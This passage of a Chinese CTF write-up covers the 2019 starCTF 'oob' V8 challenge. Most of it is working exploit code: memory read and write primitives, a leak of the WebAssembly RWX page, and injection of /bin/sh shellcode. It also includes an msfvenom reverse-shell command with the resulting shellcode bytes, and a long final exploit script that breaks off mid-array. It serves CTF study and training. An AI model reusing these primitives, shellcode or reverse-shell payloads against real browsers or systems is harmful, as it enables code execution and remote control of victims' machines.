<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> wasmCode = <span class="keyword">new</span> <span class="title class_">Uint8Array</span>([<span class="number">0</span>,<span class="number">97</span>,<span class="number">115</span>,<span class="number">109</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">133</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">96</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">127</span>,<span class="number">3</span>,<span class="number">130</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">4</span>,<span class="number">132</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">112</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">5</span>,<span class="number">131</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">6</span>,<span class="number">129</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">7</span>,<span class="number">145</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">2</span>,<span class="number">6</span>,<span class="number">109</span>,<span class="number">101</span>,<span class="number">109</span>,<span class="number">111</span>,<span class="number">114</span>,<span class="number">121</span>,<span class="number">2</span>,<span class="number">0</span>,<span class="number">4</span>,<span class="number">109</span>,<span class="number">97</span>,<span class="number">105</span>,<span class="number">110</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">10</span>,<span class="number">138</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">132</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">65</span>,<span class="number">42</span>,<span class="number">11</span>]);</span><br><span class="line"><span class="keyword">var</span> wasmModule = <span class="keyword">new</span> <span class="title class_">WebAssembly</span>.<span class="title class_">Module</span>(wasmCode);</span><br><span class="line"><span class="keyword">var</span> wasmInstance = <span class="keyword">new</span> <span class="title class_">WebAssembly</span>.<span class="title class_">Instance</span>(wasmModule, &#123;&#125;);</span><br><span class="line"><span class="keyword">var</span> f = wasmInstance.<span class="property">exports</span>.<span class="title function_">main</span>();</span><br><span class="line">%<span class="title class_">DebugPrint</span>(f);</span><br><span class="line">%<span class="title class_">SystemBreak</span>();</span><br></pre></td></tr></table></figure>

<p>我们可以通过<code>Function_Object--&gt;shared_info--&gt;data--&gt;instance</code>，通过<code>instance+0x88</code>既可以找到<code>wasm</code>的可执行内存页的地址</p>
<img src="https://lyyl-1254465038.cos.ap-beijing.myqcloud.com/V8-%E9%87%8D%E6%96%B0%E5%85%A5%E9%97%A8-2019-starCTF-oob-%E9%A2%98%E8%A7%A3/20200805164011.png" alt="图片无法显示，请联系作者" title=" ">

<p>寻找上面的地址泄露逻辑，可执行内存地址的泄露代码如下</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> wasmCode = <span class="keyword">new</span> <span class="title class_">Uint8Array</span>([<span class="number">0</span>,<span class="number">97</span>,<span class="number">115</span>,<span class="number">109</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">133</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">96</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">127</span>,<span class="number">3</span>,<span class="number">130</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">4</span>,<span class="number">132</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">112</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">5</span>,<span class="number">131</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">6</span>,<span class="number">129</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">7</span>,<span class="number">145</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">2</span>,<span class="number">6</span>,<span class="number">109</span>,<span class="number">101</span>,<span class="number">109</span>,<span class="number">111</span>,<span class="number">114</span>,<span class="number">121</span>,<span class="number">2</span>,<span class="number">0</span>,<span class="number">4</span>,<span class="number">109</span>,<span class="number">97</span>,<span class="number">105</span>,<span class="number">110</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">10</span>,<span class="number">138</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">132</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">65</span>,<span class="number">42</span>,<span class="number">11</span>]);</span><br><span class="line"><span class="keyword">var</span> wasmModule = <span class="keyword">new</span> <span class="title class_">WebAssembly</span>.<span class="title class_">Module</span>(wasmCode);</span><br><span class="line"><span class="keyword">var</span> wasmInstance = <span class="keyword">new</span> <span class="title class_">WebAssembly</span>.<span class="title class_">Instance</span>(wasmModule, &#123;&#125;);</span><br><span class="line"><span class="keyword">var</span> f = wasmInstance.<span class="property">exports</span>.<span class="property">main</span>;</span><br><span class="line"><span class="keyword">var</span> f_addr = <span class="title function_">addressOf</span>(f);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;[*] leak wasm func addr: 0x&quot;</span> + <span class="title function_">hex</span>(f_addr));</span><br><span class="line">%<span class="title class_">SystemBreak</span>();</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> shared_info_addr = <span class="title function_">read64</span>(f_addr + <span class="number">0x18n</span>) - <span class="number">0x1n</span>;</span><br><span class="line"><span class="keyword">var</span> wasm_exported_func_data_addr = <span class="title function_">read64</span>(shared_info_addr + <span class="number">0x8n</span>) - <span class="number">0x1n</span>;</span><br><span class="line"><span class="keyword">var</span> wasm_instance_addr = <span class="title function_">read64</span>(wasm_exported_func_data_addr + <span class="number">0x10n</span>) - <span class="number">0x1n</span>;</span><br><span class="line"><span class="keyword">var</span> rwx_page_addr = <span class="title function_">read64</span>(wasm_instance_addr + <span class="number">0x88n</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;[*] leak rwx_page_addr: 0x&quot;</span> + <span class="title function_">hex</span>(rwx_page_addr));</span><br><span class="line"></span><br><span class="line">%<span class="title class_">DebugPrint</span>(f);</span><br><span class="line">%<span class="title class_">SystemBreak</span>();</span><br></pre></td></tr></table></figure>

<p>可以成功的泄露可执行内存页的地址</p>
<img src="https://lyyl-1254465038.cos.ap-beijing.myqcloud.com/V8-%E9%87%8D%E6%96%B0%E5%85%A5%E9%97%A8-2019-starCTF-oob-%E9%A2%98%E8%A7%A3/20200805165843.png" alt="图片无法显示，请联系作者" title=" ">

<p>因此后续我们将<code>shellcode</code>写入这个地址就可以在调用<code>wasm</code>函数接口的时候触发我们的<code>shellcode</code>了。<code>shellcode</code>可以在<code>exploit-db</code>中寻找</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* /bin/sh for linux x64</span></span><br><span class="line"><span class="comment"> char shellcode[] = &quot;\x6a\x3b\x58\x99\x52\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x53 \x54\x5f\x52\x57\x54\x5e\x0f\x05&quot;;</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="keyword">var</span> shellcode = [</span><br><span class="line">    <span class="number">0x2fbb485299583b6an</span>,</span><br><span class="line">    <span class="number">0x5368732f6e69622fn</span>,</span><br><span class="line">    <span class="number">0x050f5e5457525f54n</span></span><br><span class="line">];</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> data_buf = <span class="keyword">new</span> <span class="title class_">ArrayBuffer</span>(<span class="number">24</span>);</span><br><span class="line"><span class="keyword">var</span> data_view = <span class="keyword">new</span> <span class="title class_">DataView</span>(data_buf);</span><br><span class="line"><span class="keyword">var</span> buf_backing_store_addr = <span class="title function_">addressOf</span>(data_buf) + <span class="number">0x20n</span>;</span><br><span class="line"></span><br><span class="line"><span class="title function_">write64</span>(buf_backing_store_addr, rwx_page_addr);  <span class="comment">//这里写入之前泄露的rwx_page_addr地址</span></span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; shellcode.<span class="property">length</span>; i++)</span><br><span class="line">    data_view.<span class="title function_">setBigUint64</span>(<span class="number">8</span>*i, shellcode[i], <span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line"><span class="title function_">f</span>();</span><br></pre></td></tr></table></figure>

<p>最终可以<code>getshell</code></p>
<img src="https://lyyl-1254465038.cos.ap-beijing.myqcloud.com/V8-%E9%87%8D%E6%96%B0%E5%85%A5%E9%97%A8-2019-starCTF-oob-%E9%A2%98%E8%A7%A3/20200805170737.png" alt="图片无法显示，请联系作者" title=" ">

<h2 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h2><p>可以用<code>msfvenom</code>来生成反弹<code>shell</code>的<code>shellcode</code></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p linux/x64/shell_reverse_tcp LHOST=127.0.0.1 LPORT=3389 -f python -o ~/Desktop/shellcode.txt</span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">shell2x64</span>(<span class="params">shellcode</span>):</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(shellcode) % <span class="number">8</span> == <span class="number">0</span>:</span><br><span class="line">        length = <span class="built_in">len</span>(shellcode)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        length = <span class="number">8</span> * (<span class="built_in">len</span>(shellcode) // <span class="number">8</span> + <span class="number">1</span>)</span><br><span class="line">    shellcode = shellcode.ljust(length, <span class="string">b&quot;\x90&quot;</span>)</span><br><span class="line">    i = <span class="number">0</span></span><br><span class="line">    de_shellcode = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">while</span> i &lt;= length - <span class="number">8</span>:</span><br><span class="line">        de_shellcode += <span class="built_in">hex</span>(u64(shellcode[i:i + <span class="number">8</span>]))</span><br><span class="line">        <span class="keyword">if</span> i != length - <span class="number">8</span>:</span><br><span class="line">            de_shellcode += <span class="string">&quot;n, &quot;</span></span><br><span class="line">        i += <span class="number">8</span></span><br><span class="line">    <span class="built_in">print</span>(de_shellcode)</span><br><span class="line"></span><br><span class="line">buf =  <span class="string">b&quot;&quot;</span></span><br><span class="line">buf += <span class="string">b&quot;\x6a\x29\x58\x99\x6a\x02\x5f\x6a\x01\x5e\x0f\x05\x48&quot;</span></span><br><span class="line">buf += <span class="string">b&quot;\x97\x48\xb9\x02\x00\x0d\x3d\x7f\x00\x00\x01\x51\x48&quot;</span></span><br><span class="line">buf += <span class="string">b&quot;\x89\xe6\x6a\x10\x5a\x6a\x2a\x58\x0f\x05\x6a\x03\x5e&quot;</span></span><br><span class="line">buf += <span class="string">b&quot;\x48\xff\xce\x6a\x21\x58\x0f\x05\x75\xf6\x6a\x3b\x58&quot;</span></span><br><span class="line">buf += <span class="string">b&quot;\x99\x48\xbb\x2f\x62\x69\x6e\x2f\x73\x68\x00\x53\x48&quot;</span></span><br><span class="line">buf += <span class="string">b&quot;\x89\xe7\x52\x57\x48\x89\xe6\x0f\x05&quot;</span></span><br><span class="line"></span><br><span class="line">shell2x64(buf)</span><br></pre></td></tr></table></figure>

<p>最终监听<code>3389</code>端口<code>getshell</code></p>
<img src="https://lyyl-1254465038.cos.ap-beijing.myqcloud.com/V8-%E9%87%8D%E6%96%B0%E5%85%A5%E9%97%A8-2019-starCTF-oob-%E9%A2%98%E8%A7%A3/20200805173733.png" alt="图片无法显示，请联系作者" title=" ">

<p>最终脚本如下`</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> obj = &#123;<span class="string">&quot;a&quot;</span>: <span class="number">1</span>&#125;;</span><br><span class="line"><span class="keyword">var</span> obj_array = [obj];</span><br><span class="line"><span class="keyword">var</span> float_array = [<span class="number">1.1</span>];</span><br><span class="line"><span class="keyword">var</span> obj_array_map = obj_array.<span class="title function_">oob</span>();</span><br><span class="line"><span class="keyword">var</span> float_array_map = float_array.<span class="title function_">oob</span>();</span><br><span class="line"><span class="keyword">var</span> buf =<span class="keyword">new</span> <span class="title class_">ArrayBuffer</span>(<span class="number">16</span>);</span><br><span class="line"><span class="keyword">var</span> float64 = <span class="keyword">new</span> <span class="title class_">Float64Array</span>(buf);</span><br><span class="line"><span class="keyword">var</span> bigUint64 = <span class="keyword">new</span> <span class="title class_">BigUint64Array</span>(buf);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 浮点数转换为64位无符号整数</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">f2i</span>(<span class="params">f</span>)</span><br><span class="line">&#123;</span><br><span class="line">    float64[<span class="number">0</span>] = f;</span><br><span class="line">    <span class="keyword">return</span> bigUint64[<span class="number">0</span>];</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 64位无符号整数转为浮点数</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">i2f</span>(<span class="params">i</span>)</span><br><span class="line">&#123;</span><br><span class="line">    bigUint64[<span class="number">0</span>] = i;</span><br><span class="line">    <span class="keyword">return</span> float64[<span class="number">0</span>];</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 64位无符号整数转为16进制字节串</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">hex</span>(<span class="params">i</span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">return</span> i.<span class="title function_">toString</span>(<span class="number">16</span>).<span class="title function_">padStart</span>(<span class="number">16</span>, <span class="string">&quot;0&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 泄露指定对象的地址</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">addressOf</span>(<span class="params">obj_to_leak</span>)&#123;</span><br><span class="line">    obj_array[<span class="number">0</span>] = obj_to_leak;</span><br><span class="line">    <span class="comment">// type(obj)--&gt;type(float)</span></span><br><span class="line">    obj_array.<span class="title function_">oob</span>(float_array_map);</span><br><span class="line">    <span class="keyword">let</span> addr = <span class="title function_">f2i</span>(obj_array[<span class="number">0</span>])-<span class="number">1n</span>;</span><br><span class="line">    obj_array.<span class="title function_">oob</span>(obj_array_map);</span><br><span class="line">    <span class="keyword">return</span> addr;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 把某个地址转换为对象</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">fakeObject</span>(<span class="params">addr_to_fake</span>)&#123;</span><br><span class="line">    float_array[<span class="number">0</span>] = <span class="title function_">i2f</span>(addr_to_fake+<span class="number">1n</span>);</span><br><span class="line">    <span class="comment">// type(float)--&gt;type(obj)</span></span><br><span class="line">    float_array.<span class="title function_">oob</span>(obj_array_map);</span><br><span class="line">    <span class="keyword">let</span> fake_obj = float_array[<span class="number">0</span>];</span><br><span class="line">    float_array.<span class="title function_">oob</span>(float_array_map);</span><br><span class="line">    <span class="keyword">return</span> fake_obj;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> fake_array = [</span><br><span class="line">    float_array_map,</span><br><span class="line">    <span class="title function_">i2f</span>(<span class="number">0n</span>),</span><br><span class="line">    <span class="title function_">i2f</span>(<span class="number">0x41414141n</span>),<span class="comment">//fake obj&#x27;s elements ptr</span></span><br><span class="line">    <span class="title function_">i2f</span>(<span class="number">0x1000000000n</span>),</span><br><span class="line">    <span class="number">1.1</span>,</span><br><span class="line">    <span class="number">2.2</span></span><br><span class="line">];</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> fake_arr_addr = <span class="title function_">addressOf</span>(fake_array);</span><br><span class="line"><span class="keyword">var</span> fake_object_addr = fake_arr_addr - <span class="number">0x40n</span> + <span class="number">0x10n</span>;</span><br><span class="line"><span class="keyword">var</span> fake_object = <span class="title function_">fakeObject</span>(fake_object_addr);</span><br><span class="line"></span><br><span class="line"><span class="comment">//randomRead</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">read64</span>(<span class="params">addr</span>)</span><br><span class="line">&#123;</span><br><span class="line">    fake_array[<span class="number">2</span>] = <span class="title function_">i2f</span>(addr - <span class="number">0x10n</span> + <span class="number">0x1n</span>);</span><br><span class="line">    <span class="keyword">let</span> leak_data = <span class="title function_">f2i</span>(fake_object[<span class="number">0</span>]);</span><br><span class="line">    <span class="comment">//console.log(&quot;[*] leak from: 0x&quot; +hex(addr) + &quot;: 0x&quot; + hex(leak_data));</span></span><br><span class="line">    <span class="keyword">return</span> leak_data;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">write64</span>(<span class="params">addr,data</span>)</span><br><span class="line">&#123;</span><br><span class="line">    fake_array[<span class="number">2</span>] = <span class="title function_">i2f</span>(addr - <span class="number">0x10n</span> + <span class="number">0x1n</span>);</span><br><span class="line">    fake_object[<span class="number">0</span>] = <span class="title function_">i2f</span>(data);</span><br><span class="line">    <span class="comment">//console.log(&quot;[*] write to : 0x&quot; +hex(addr) + &quot;: 0x&quot; + hex(data));</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> data_buf = <span class="keyword">new</span> <span class="title class_">ArrayBuffer</span>(<span class="number">8</span>);</span><br><span class="line"><span class="keyword">var</span> data_view = <span class="keyword">new</span> <span class="title class_">DataView</span>(data_buf);</span><br><span class="line"><span class="keyword">var</span> buf_backing_store_addr = <span class="title function_">addressOf</span>(data_buf) + <span class="number">0x20n</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">writeDataview</span>(<span class="params">addr,data</span>)&#123;</span><br><span class="line">    <span class="title function_">write64</span>(buf_backing_store_addr,addr);</span><br><span class="line">    data_view.<span class="title function_">setBigUint64</span>(<span class="number">0</span>,data,<span class="literal">true</span>);</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;[*] write to : 0x&quot;</span> +<span class="title function_">hex</span>(addr) + <span class="string">&quot;: 0x&quot;</span> + <span class="title function_">hex</span>(data));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*var a = [1.1, 2.2, 3.3];</span></span><br><span class="line"><span class="comment">//%DebugPrint(a);</span></span><br><span class="line"><span class="comment">var start_addr = addressOf(a);</span></span><br><span class="line"><span class="comment">var leak_d8_addr = 0n;</span></span><br><span class="line"><span class="comment">while(1)</span></span><br><span class="line"><span class="comment">&#123;</span></span><br><span class="line"><span class="comment">    start_addr -= 0x8n;</span></span><br><span class="line"><span class="comment">    leak_d8_addr = read64(start_addr);</span></span><br><span class="line"><span class="comment">    if((leak_d8_addr &amp; 0xfffn) == 0xe40n &amp;&amp; read64(leak_d8_addr) == 0x56415741e5894855n)</span></span><br><span class="line"><span class="comment">    &#123;</span></span><br><span class="line"><span class="comment">        console.log(&quot;[*] Success find leak_d8_addr: 0x&quot; + hex(leak_d8_addr));</span></span><br><span class="line"><span class="comment">        break;</span></span><br><span class="line"><span class="comment">    &#125;</span></span><br><span class="line"><span class="comment">&#125;</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">var a = [1.1, 2.2, 3.3];</span></span><br><span class="line"><span class="comment">//%DebugPrint(a);</span></span><br><span class="line"><span class="comment">var code_addr = read64(addressOf(a.constructor) + 0x30n);</span></span><br><span class="line"><span class="comment">console.log(&quot;[*] find addressOf(a.constructor): 0x&quot; + hex(addressOf(a.constructor)));</span></span><br><span class="line"><span class="comment">console.log(&quot;[*] find code addr: 0x&quot; + hex(code_addr));</span></span><br><span class="line"><span class="comment">var leak_d8_addr = read64(code_addr + 0x41n);</span></span><br><span class="line"><span class="comment">console.log(&quot;[*] find libc leak_d8_addr: 0x&quot; + hex(leak_d8_addr));</span></span><br><span class="line"><span class="comment">//%SystemBreak();</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">console.log(&quot;[*] Done.&quot;);</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">//var d8_base_addr = leak_d8_addr - 0x997e40n;</span></span><br><span class="line"><span class="comment">var d8_base_addr = leak_d8_addr - 0xad54e0n;</span></span><br><span class="line"><span class="comment">var d8_got_libc_start_main_addr = d8_base_addr + 0xd98730n;</span></span><br><span class="line"><span class="comment">console.log(&quot;[*] d8_got_libc_start_main_addr: 0x&quot; + hex(d8_got_libc_start_main_addr));</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">var libc_start_main_addr = read64(d8_got_libc_start_main_addr);</span></span><br><span class="line"><span class="comment">var libc_base_addr = libc_start_main_addr - 0x26fc0n;</span></span><br><span class="line"><span class="comment">var libc_system_addr = libc_base_addr + 0x55410n;</span></span><br><span class="line"><span class="comment">var libc_free_hook_addr = libc_base_addr + 0x1eeb28n;</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">console.log(&quot;[*] find libc addr: 0x&quot; + hex(libc_base_addr));</span></span><br><span class="line"><span class="comment">console.log(&quot;[*] find libc system address: 0x&quot; + hex(libc_system_addr));</span></span><br><span class="line"><span class="comment">console.log(&quot;[*] find libc libc_free_hook_addr: 0x&quot; + hex(libc_free_hook_addr));</span></span><br><span class="line"><span class="comment">//%SystemBreak();</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">writeDataview(libc_free_hook_addr, libc_system_addr);</span></span><br><span class="line"><span class="comment">console.log(&quot;[*] Write ok.&quot;);</span></span><br><span class="line"><span class="comment">//%SystemBreak();</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">function get_shell()</span></span><br><span class="line"><span class="comment">&#123;</span></span><br><span class="line"><span class="comment">    let get_shell_buffer = new ArrayBuffer(0x1000);</span></span><br><span class="line"><span class="comment">    let get_shell_dataview = new DataView(get_shell_buffer);</span></span><br><span class="line"><span class="comment">    get_shell_dataview.setFloat64(0, i2f(0x0068732f6e69622fn)); // str --&gt; /bin/sh\x00 </span></span><br><span class="line"><span class="comment">&#125;</span></span><br><span class="line"><span class="comment">get_shell();*/</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> wasmCode = <span class="keyword">new</span> <span class="title class_">Uint8Array</span>([<span class="number">0</span>,<span class="number">97</span>,<span class="number">115</span>,<span class="number">109</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">133</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">96</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">127</span>,<span class="number">3</span>,<span class="number">130</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span 